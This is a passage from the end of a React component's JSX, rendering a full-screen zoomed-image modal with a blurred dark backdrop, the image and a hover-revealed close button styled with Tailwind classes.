           <div className="absolute inset-0 bg-black/95 backdrop-blur-3xl" onClick={() => setZoomedMedia(null)}></div>
           <div className="relative z-10 w-full h-full flex items-center justify-center group">
              <img src={zoomedMedia} alt="Zoomed Capture" className="max-w-full max-h-full object-contain shadow-[0_0_100px_rgba(0,0,0,0.8)] rounded-2xl" />
              <button onClick={() => setZoomedMedia(null)} className="absolute top-0 right-0 p-4 text-white opacity-0 group-hover:opacity-100 transition-opacity bg-black/20 hover:bg-red-600 rounded-bl-3xl rounded-tr-2xl"><X size={40} /></button>
           </div>
        </div>
      )}
    </div>
  );
}
